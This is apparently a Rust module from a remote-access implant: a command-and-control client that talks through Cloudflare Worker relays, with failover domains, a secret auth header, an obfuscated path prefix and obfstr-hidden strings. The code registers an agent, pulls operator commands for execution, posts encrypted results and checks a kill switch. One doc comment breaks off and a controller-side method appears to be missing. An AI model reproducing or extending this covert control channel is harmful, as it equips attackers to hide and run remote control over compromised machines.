//! Worker channel client — Cloudflare Worker relay over D1.
//!
//! Config source (three-tier priority, same as github_token):
//!   runtime env > compile-time option_env! > embedded_config accessors
//! Env vars:
//!   C2_CHANNEL=worker
//!   C2_WORKER_URLS=https://a.workers.dev,https://cdn.example.com   (1-2, failover)
//!   C2_WORKER_SECRET=<shared secret>
//!
//! All payloads keep the "<!-- c|r -->" + AES envelope used by the GitHub
//! channel; comments are returned in GitHub-JSON shape (id/body/created_at)
//! so main.rs reuses its watermark + execute + dedup logic verbatim.

use serde_json::{json, Value};

pub struct WorkerChan {
    pub urls: Vec<String>,
    pub secret: String,
    /// Random path prefix required by the relay (PATH_SECRET), e.g. "a3f9k2-status".
    path_prefix: String,
    /// Sticky index of the last domain that answered (failover).
    preferred: std::sync::atomic::AtomicUsize,
}

impl WorkerChan {
    /// Takes raw values (not &Config) so this module compiles in BOTH crate
    /// roots: the bin (main.rs owns Config) and the lib (lib_entry.rs doesn't).
    pub fn from_parts(channel_type: &str, urls: &[String], secret: &str, path: &str) -> Option<Self> {
        // GitHub/Notion 主通道也可以带 Worker 备用：只看 URL+secret，
        // 不再要求 channel_type=="worker"（否则切备后 worker_chan() 恒为 None）。
        let _ = channel_type;
        let urls: Vec<String> = urls.iter()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        if urls.is_empty() || secret.trim().is_empty() {
            return None;
        }
        Some(WorkerChan {
            urls,
            secret: secret.to_string(),
            path_prefix: path.to_string(),
            preferred: std::sync::atomic::AtomicUsize::new(0),
        })
    }

    /// Full path for an endpoint: /<PATH_SECRET><endpoint>.
    fn p(&self, endpoint: &str) -> String {
        if self.path_prefix.is_empty() {
            endpoint.to_string()
        } else {
            format!("/{}/{}", self.path_prefix.trim_matches('/'), endpoint)
        }
    }

    fn preferred(&self) -> usize {
        self.preferred.load(std::sync::atomic::Ordering::Relaxed)
    }

    /// Try the preferred domain first, then the backup; remember the winner.
    fn request(&self, method: &str, path: &str, body: Option<&Value>) -> Result<Value, String> {
        if self.urls.is_empty() {
            return Err("worker: no C2_WORKER_URLS configured".into());
        }
        let start = self.preferred();
        let n = self.urls.len();
        let mut last_err = String::new();
        for off in 0..n {
            let idx = (start + off) % n;
            let url = format!("{}{}", self.urls[idx].trim_end_matches('/'), path);
            let req = crate::net::request(method, &url)
                .timeout(std::time::Duration::from_secs(20))
                .set(obfstr::obfstr!("X-C2-Auth"), &self.secret);
            let err: Option<String>;
            let resp = match body {
                Some(v) => req
                    .set("Content-Type", "application/json")
                    .send_string(&v.to_string())
                    .map_err(|e| e.to_string()),
                None => req.call().map_err(|e| e.to_string()),
            };
            match resp {
                Ok(r) if r.status() == 200 => {
                    match r.into_json::<Value>() {
                        Ok(v) => {
                            self.preferred.store(idx, std::sync::atomic::Ordering::Relaxed);
                            return Ok(v);
                        }
                        Err(e) => err = Some(format!("worker json: {}", e)),
                    }
                }
                Ok(r) => err = Some(format!("HTTP {}", r.status())),
                Err(e) => err = Some(e),
            }
            if let Some(e) = err {
                last_err = format!("domain[{}] {}: {}", idx, self.urls[idx], e);
            }
        }
        Err(format!("worker: all domains failed — {}", last_err))
    }

    /// Register / refresh presence. Returns the agent id to use.
    pub fn register(&self, agent_id: &str, reg_body: &str) -> Result<(), String> {
        self.request(
            "POST",
            &self.p(obfstr::obfstr!("reg")),
            Some(&json!({ "agent_id": agent_id, "body": reg_body })),
        )
        .map(|_| ())
    }

    /// Fetch new commands (direction 'c') after the watermark, oldest first.
    pub fn fetch_commands(&self, agent_id: &str, since: u64) -> Result<Vec<Value>, String> {
        let v = self.request("GET", &format!("{}", self.p(&format!("{}{}?since={}", obfstr::obfstr!("d2c/"), agent_id, since))), None)?;
        Ok(v.get("comments")
            .and_then(|c| c.as_array())
            .cloned()
            .unwrap_or_default())
    }

    /// Post a response / heartbeat comment (direction 'r').
    pub fn post_comment(&self, agent_id: &str, body: &str, resp_to: Option<&str>) -> Result<(), String> {
        self.request(
            "POST",
            &format!("{}", self.p(&format!("{}{}", obfstr::obfstr!("d2c/"), agent_id))),
            Some(&json!({ "body": body, "resp_to": resp_to })),
        )
        .map(|_| ())
    }

    /// Controller-side: read agent responses (used by the web controller,

    pub fn check_kill(&self) -> Result<bool, String> {
        let v = self.request("GET", &self.p(obfstr::obfstr!("kill")), None)?;
        Ok(v.get("active").and_then(|a| a.as_bool()).unwrap_or(false))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn from_parts_allows_github_primary_with_worker_backup() {
        let ch = WorkerChan::from_parts(
            "github",
            &["https://a.workers.dev".into()],
            "shared-secret",
            "p1",
        );
        assert!(ch.is_some());
    }

    #[test]
    fn from_parts_none_without_urls_or_secret() {
        assert!(WorkerChan::from_parts("worker", &[], "sec", "p").is_none());
        assert!(WorkerChan::from_parts("worker", &["https://a.workers.dev".into()], "", "p").is_none());
        assert!(WorkerChan::from_parts("github", &["".into()], "sec", "p").is_none());
    }
}
